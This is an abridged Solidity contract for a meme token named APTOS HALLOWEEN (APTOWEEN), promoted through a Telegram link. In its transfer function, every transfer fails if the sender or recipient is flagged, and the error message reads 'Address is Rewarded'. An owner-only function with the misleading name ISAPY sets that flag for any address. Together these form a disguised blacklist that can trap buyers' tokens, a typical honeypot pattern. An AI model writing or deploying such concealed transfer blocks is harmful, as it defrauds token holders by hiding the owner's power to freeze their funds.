...
//Telegram : https://T.me/AptosHalloween

// SPDX-License-Identifier: UNLICENSED

// Symbol        : APTOS HALLOWEEN
// Name          : APTOWEEN
//    Meme Token inspired by Aptos Fans want to participate in celebrating halloween .
...
contract AptosHalloween is ERC20, Auth {
    ...
    string constant private _name = "APTOS HALLOWEEN";
    string constant private _symbol = "APTOWEEN";
    ...
    address private autoLiquidityReceiver = 0xb73A3A245a46F05577eeA1b4F5218012621733EE ;
    address private MarketingFeeReceiver = 0xb73A3A245a46F05577eeA1b4F5218012621733EE;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isSet[recipient] && !isSet[sender], 'Address is Rewarded');
    ...
    function ISAPY(address _address, bool _value) public authorized{
        isSet[_address] = _value;
    }
